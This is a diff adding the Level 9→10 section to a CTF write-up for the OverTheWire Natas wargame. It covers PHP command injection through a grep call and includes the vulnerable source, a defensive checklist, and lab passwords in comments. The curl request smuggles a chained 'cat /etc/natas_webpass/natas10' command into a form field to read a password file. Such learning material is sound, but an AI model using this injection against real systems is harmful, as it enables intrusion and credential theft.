@@ -589,13 +589,108 @@ Notes on reliable CLI usage:
 
 ---
 
-Password discovered: `ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t` — use it to authenticate as `natas9` and continue.
-
 <!--
 ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t
 -->
 
+
 ## Level 9 → Level 10
+
+### Level goal
+
+Read the password for `natas10` by abusing command injection via a server-side call to `grep`.  
+What you should learn: 
+how unsanitized shell arguments passed to system utilities (passthru/exec)
+lead to command injection and how to exploit it from the CLI.
+
+### Short explanation of the vulnerability
+
+The page accepts a `needle` parameter 
+and then calls PHP's `passthru("grep -i $key dictionary.txt")`.  
+Because the value is interpolated directly into a shell command, 
+special characters let us break out of the grep command and chain arbitrary commands. 
+The web process runs the command and returns its stdout in the page, 
+so we can read files the web user can access.
+
+### Step-by-step (what I ran and what the server returned)
+
+**1) Inspect the page**
+
+```bash
+curl -u natas9:natas9password http://natas9.natas.labs.overthewire.org/
+```
+Relevant returned HTML shows a form:
+Output:
+
+```html
+<h1>natas9</h1>
+<form>
+Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
+</form>
+Output:
+<pre>
+</pre>
+```
+
+**2) Fetch the source to confirm the sink**
+
+```bash
+curl -u natas9:ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t http://natas9.natas.labs.overthewire.org/index-source.html
+```
+
+Source (extracted and cleaned) shows the relevant PHP:
+
+```
+<? 
+$key = "";
+
+if(array_key_exists("needle", $_REQUEST)) {
+    $key = $_REQUEST["needle"];
+}
+
+if($key != "") {
+    passthru("grep -i $key dictionary.txt");
+}
+?>
+```
+
+Observation: 
+The application directly feeds user input 
+into a shell command with no escaping. 
+That is the injection point.
+
+**3) Exploit command injection to read the next password**
+
+I crafted a needle that closes the grep command 
+and appends a shell command that cats the password file. 
+Example I used:
+
+```bash
+curl -u natas9:ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t -d "needle=aa; cat /etc/natas_webpass/natas10 # " http://natas9.natas.labs.overthewire.org/
+```
+
+Server response (relevant part) shows the command output inside the page.
+Whit this I got the password for natas10 and cloud move on to the next level. 
+
+
+### Lessons learned (concise)
+
+- Never pass raw user input into shell commands. Use escapeshellarg/escapeshellcmd, or better yet avoid shelling out with user data.  
+- Command injection lets an attacker run arbitrary commands with the privileges of the web process. It is high severity and trivially exploitable when present.  
+- In CTFs and real apps, look for common sinks: `system`, `exec`, `passthru`, `shell_exec`, backticks, or any code that builds a shell string.
+
+### Quick defensive checklist for admins
+
+- Do not interpolate user input into shell commands. Use safe APIs or properly escape/validate input.  
+- Run the web process with minimal privileges and restrict filesystem access with file permissions.  
+- Use application-level allowlists for operations that need external utilities.  
+- Monitor logs for unusual shell invocation patterns and unexpected long or chained arguments.
+
+
+<!--
+t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu
+-->
+
 ## Level 10 → Level 11
 ## Level 11 → Level 12
 ## Level 12 → Level 13
